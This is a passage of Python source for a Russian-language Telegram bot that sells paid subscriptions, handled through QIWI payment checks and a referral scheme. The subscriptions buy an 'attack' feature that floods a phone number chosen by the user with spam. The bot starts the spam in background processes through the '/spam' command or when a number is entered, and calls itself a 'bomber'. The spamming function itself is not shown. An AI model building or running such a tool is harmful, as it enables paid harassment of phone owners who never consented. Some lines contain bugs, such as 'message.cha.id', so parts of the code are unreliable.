        s.headers['authorization'] = 'Bearer' + token
        parameters = {'publicKey':publick_key,'amount':amount,'phone':phone,'comment':comment}
        h = s.get('https://oplata.qiwi.com/create', params = parameters)
        inlinepay_keyboard = types.InlineKeyboardMarkup()
        pay_sub = types.InlineKeyboardButton('Оплатить подписку(qiwi)', url=h.url)
        check_pay = types.InlineKeyboardButton(text='Проверить оплату QIWI😎',callback_data='checkpay')
        pay_sub_balance = types.InlineKeyboardButton(text='Оплатить с баланса в боте',callback_data='checkbalance')
        inlinepay_keyboard = inlinepay_keyboard.add(pay_sub).add(pay_sub_balance).add(check_pay)
        await bot.send_message(message.chat.id, f'Для оплаты нажмите на кнопку ниже.', reply_markup=inlinepay_keyboard)
        new_payment(message.chat.id,comment,amount)
    elif check:
        await bot.send_message(message.chat.id, 'Вы уже купили подписку,удачного пользования!', reply_markup=main_keyboard)
    


@dp.callback_query_handler(text='checkpay')
async def check_payment(query: types.CallbackQuery):
    comment = get_comment(query.message.chat.id)
    s = requests.Session()
    s.headers['authorization'] = 'Bearer ' +  token
    parameters = {'rows': '50', 'operation':'IN'}
    h = s.get('https://edge.qiwi.com/payment-history/v1/persons/'+ phone +'/payments', params = parameters)
    result = json.loads(h.text)
    for i in range(len(result['data'])):
        if result['data'][i]['comment'] == str(comment):
            if result['data'][i]['sum']['amount'] >= amount:
                await bot.send_message(query.message.chat.id, 'Оплата прошла,добавил вас в базу')
                inviter = referal_pay(query.message.chat.id)
                await bot.send_message(inviter, 'Ваш реферал оплатил подписку вам начислено 10%🤑')
                add_sub(query.message.chat.id)
                break
        else:
            await bot.send_message(query.message.chat.id, 'Не нашел вашу оплату')
            break

@dp.callback_query_handler(text='checkbalance')
async def check_balance(query: types.CallbackQuery):
    pay = checkbalance(query.message.chat.id)
    if pay:
        await bot.send_message(query.message.chat.id, 'Вы успешно купили подписку💎')
    elif not pay:
        await bot.send_message(query.message.chat.id, 'На вашем балансе не достаточно денег!')



@dp.message_handler(text=['Начать атаку💡'])
async def spam_start_func(message: types.Message):
    referal_button = types.KeyboardButton('Реферальная система🎯')
    admin_button = types.KeyboardButton('Админ панель🔒')
    help_button = types.KeyboardButton('Помощь⚡️')
    back_button = types.KeyboardButton('Назад')
    spam_button = types.KeyboardButton('Закончить атаку💡')
    profile_keyboard = types.ReplyKeyboardMarkup().add(referal_button,admin_button,spam_button,help_button,back_button)
    await bot.send_message(message.chat.id, 'Напишите номер,пример 7XXX.', reply_markup=profile_keyboard)



@dp.message_handler(text=['Закончить атаку💡'])
async def stop_spam_func(message:types.Message):
    await bot.send_message(message.chat.id, 'Успешно приостановлен', reply_markup=profile_keyboard)



@dp.message_handler(text=['Админ панель🔒'])
async def admin(message: types.Message):
    chat_id = message.chat.id
    if chat_id in admins:
        await bot.send_message(message.chat.id, 'Вы вошли в админ панель.\n/sub @ТЕЛЕГРАММ ID - выдать бесплатную подписку\n/changebalance @ТЕЛЕГРАММ ID - сбросить реферальный баланс до нуля')
    else:
        await bot.send_message(message.chat.id, 'У вас нет доступа к админ панели!')


@dp.message_handler(text=['Реферальная система🎯'])
async def referal_system(message: types.Message):
    balance = get_balance(message.chat.id)
    await bot.send_message(message.chat.id, f'Получите 10% от пополнения ваших рефералов💳\nБаланс от рефералов:{balance}₽\nВаш реферальный код:{message.chat.id}⚙️\nКоличество ваших рефералов:{get_referals(message.chat.id,message.chat.id)}⭐️')



@dp.message_handler(content_types=['text'])
async def admin_commands(message: types.Message):
    if '/sub' in message.text:
        chat_id = message.chat.id
        telegram_id = message.text.replace('/sub', '').replace(' ', '')
        if chat_id in admins:
            new_user(telegram_id)
            add_sub(telegram_id)
            await bot.send_message(message.chat.id, 'Выдал бесплатный доступ👥')
            try:
                await bot.send_message(telegram_id, 'Вам выдали бесплатный доступ к боту🤩')
            except:
                pass
        else:
            await bot.send_message(message.chat.id, 'У вас нет доступа к данной функции!')
    elif '/ref' in message.text:
        promo = message.text.replace('/ref', ' ').replace(' ', '')
        add_promo(message.chat.id, promo)
        await bot.send_message(message.chat.id, 'Промокод активирован!')
    elif '/spam' in message.text:
        check = check_sub(message.chat.id)
        number = message.get_args()
        if check and number != '' and len(number) == 11:
            await bot.send_message(message.chat.id, f'Спам на номер {number} запущен!')
            spam_thread = Process(target=start_spam, args=(number,))
            spam_thread.start()
        elif check and len(number) != 11:
            await bot.send_message(message.chat.id, f'Ожидается 11 цифр,вы ввели {len(number)}')

    elif message.text == '/admin':
        chat_id = message.chat.id
        if chat_id in admins:
            await bot.send_message(message.chat.id, 'Вы вошли в админ панель.\n/sub @ТЕЛЕГРАММ ID - выдать бесплатную подписку')
        else:
            await bot.send_message(message.chat.id, 'У вас нет доступа к админ панели!')
    elif message.text == '/stop':
        await bot.send_message(message.cha.id, 'Бомбер будет выключен в течение 5 мин.')
    elif '79' in message.text and len(message.text) == 11:
        check = check_sub(message.chat.id)
        if not check or check == None:
            await bot.send_message(message.chat.id, 'У вас нет подписки!Для покупки напишете Оплата👀')
        elif check:
            number = message.text
            await bot.send_message(message.chat.id, f'Спам на номер {number} запущен!')
            spam_thread = Process(target=start_spam, args=(number,))
            spam_thread.start()
    elif '/changebalance' in message.text:
        telegram_id = message.text.replace('/changebalance', ' ').replace(' ', '')
        edit_balance(telegram_id)
    elif '/stop' in message.text:
        await bot.send_message(message.chat.id, 'Успешно приостановлен.')



if __name__ == '__main__':
    executor.start_polling(dp)
